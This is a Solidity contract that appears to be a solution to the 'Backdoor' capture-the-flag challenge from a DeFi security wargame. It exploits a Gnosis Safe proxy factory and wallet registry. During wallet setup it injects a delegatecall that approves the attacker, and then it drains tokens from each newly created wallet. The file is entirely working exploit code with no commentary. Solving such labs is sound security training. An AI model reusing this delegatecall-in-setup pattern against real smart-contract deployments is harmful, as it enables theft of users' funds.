pragma solidity ^0.8.0;

import '../backdoor/GnosisSafeProxyFactory.sol';
import '../backdoor/WalletRegistry.sol';
import '../DamnValuableToken.sol';

contract BackdoorAttack {

    address owner;
    address[] users;

    constructor(address[] memory _users) {
        owner = msg.sender;
        for (uint i = 0; i < _users.length; i++)
            users.push(_users[i]);
    }

    function approve(address token, address receiver) public {
        // proxy delegates call to this function
        DamnValuableToken(token).approve(receiver, 10 ether);
    }

    function attack(
        address masterCopy, address _factory, address _callback, 
        address token) public {
        
        GnosisSafeProxyFactory factory = GnosisSafeProxyFactory(_factory);
        WalletRegistry registry = WalletRegistry(_callback);

        for (uint i = 0; i < users.length; i++) {
            address[] memory user = new address[](1);
            user[0] = users[i];
            bytes memory _setup = abi.encodeWithSelector(
                hex'b63e800d', // GnosisSafe.selectors.setup
                user,
                1,
                address(this),
                abi.encodeWithSignature(
                    "approve(address,address)", token, address(this)
                ),
                address(0),
                address(0),
                0,
                payable(address(0))
            );
            address proxy = address(factory.createProxyWithCallback(
                masterCopy, _setup, 0, registry));

            DamnValuableToken(token).transferFrom(proxy, owner, 10 ether);
        }
    }

}
